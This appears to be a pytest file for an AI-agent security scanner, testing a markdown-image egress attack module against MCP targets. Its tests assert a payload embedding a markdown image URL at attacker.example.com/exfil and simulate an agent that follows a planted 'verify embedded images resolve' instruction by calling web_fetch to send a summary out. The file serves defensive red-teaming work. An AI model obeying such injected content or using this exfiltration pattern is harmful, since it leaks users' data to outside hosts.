"""Markdown image/link egress attack module (issue #130).

Mirrors ``test_third_party_attack_module.py``'s two-halves-of-the-fix shape:
the module must be discoverable+opt-in-able like any plugin, AND its payload
must actually survive the engine's metadata gate and fire its predicate --
"reaching the scan" is not the same as the attack landing.
"""

from __future__ import annotations

import json

from mylonite.contracts import TargetDescriptor
from mylonite.contracts._types import AdapterResponse
from mylonite.plugins._reference.markdown_egress_module import (
    MarkdownImageEgressAttackModule,
)
from mylonite.scan.assembly import ATTACK_MODULES_ENV, select_attack_modules
from mylonite.scan.engine import REQUIRED_METADATA_KEYS
from mylonite.scan.predicates import lookup_predicate

_MODULE_ID = "w3-markdown-image-link-egress"


def _descriptor(kind: str = "mcp") -> TargetDescriptor:
    return TargetDescriptor(target_id="reference:vulnerable", kind=kind)


def test_module_is_excluded_by_default() -> None:
    selected = select_attack_modules([MarkdownImageEgressAttackModule()], extra_ids=frozenset())
    assert selected == []


def test_module_runs_when_opted_in(monkeypatch) -> None:
    monkeypatch.setenv(ATTACK_MODULES_ENV, _MODULE_ID)
    selected = select_attack_modules([MarkdownImageEgressAttackModule()])
    assert [m.attack_metadata().id for m in selected] == [_MODULE_ID]


def test_generate_payloads_only_for_mcp_targets() -> None:
    module = MarkdownImageEgressAttackModule()
    assert list(module.generate_payloads(_descriptor(kind="http-agent"))) == []
    payloads = list(module.generate_payloads(_descriptor(kind="mcp")))
    assert len(payloads) == 1


def test_payload_carries_the_bait_and_survives_the_metadata_gate() -> None:
    payload = next(iter(MarkdownImageEgressAttackModule().generate_payloads(_descriptor())))

    # The bait: a markdown image URL, not a bare instruction to call a tool.
    assert "![" in payload.body
    assert "http://attacker.example.com/exfil" in payload.body
    assert "web_fetch" not in payload.body  # no tool named -- that's the point

    missing = REQUIRED_METADATA_KEYS - set(payload.metadata)
    assert not missing, f"payload would be skipped as invalid metadata; missing {sorted(missing)}"

    # Reuses the shared predicate -- this module ships no new oracle.
    assert callable(lookup_predicate(payload.metadata["predicate"]))
    assert payload.metadata["weakness"] == "W3"
    assert payload.metadata["setup"] == "seed_note"
    assert payload.metadata["drive"] == "read_note_for_summary"


def test_predicate_fires_when_the_planner_takes_the_bait() -> None:
    """Reaching the engine is not enough -- simulate the planner following the
    bait's 'verify embedded images resolve' instruction and calling web_fetch
    with the markdown URL, then confirm the shared predicate scores it True.
    """
    payload = next(iter(MarkdownImageEgressAttackModule().generate_payloads(_descriptor())))
    predicate = lookup_predicate(payload.metadata["predicate"])

    trace = [
        {
            "tool": "web_fetch",
            "args": {"url": "http://attacker.example.com/exfil?d=summary"},
            "result": "<<fetched body>>",
            "is_error": False,
        }
    ]
    response = AdapterResponse(
        payload_pattern_id=payload.pattern_id,
        raw_response="Summary attached, all images verified.",
        tool_calls=["write_note", "web_fetch"],
        metadata={"effect_trace": json.dumps(trace)},
    )

    verdict = predicate(payload, response)
    assert verdict is not None and verdict.success is True
    assert verdict.evidence["destination"] == "http://attacker.example.com/exfil?d=summary"


def test_predicate_does_not_fire_when_the_planner_declines_the_bait() -> None:
    """The honest control: the planner summarises without fetching anything."""
    payload = next(iter(MarkdownImageEgressAttackModule().generate_payloads(_descriptor())))
    predicate = lookup_predicate(payload.metadata["predicate"])

    response = AdapterResponse(
        payload_pattern_id=payload.pattern_id,
        raw_response="Here is the summary. I did not fetch the embedded image.",
        tool_calls=["write_note"],
        metadata={"effect_trace": json.dumps([])},
    )

    verdict = predicate(payload, response)
    assert verdict is not None and verdict.success is False


def test_attack_metadata_carries_required_compliance_tags() -> None:
    meta = MarkdownImageEgressAttackModule().attack_metadata()
    assert meta.id == _MODULE_ID
    assert "LLM06" in meta.compliance.owasp_llm
    assert meta.compliance.owasp_asi
    assert meta.compliance.mitre_atlas
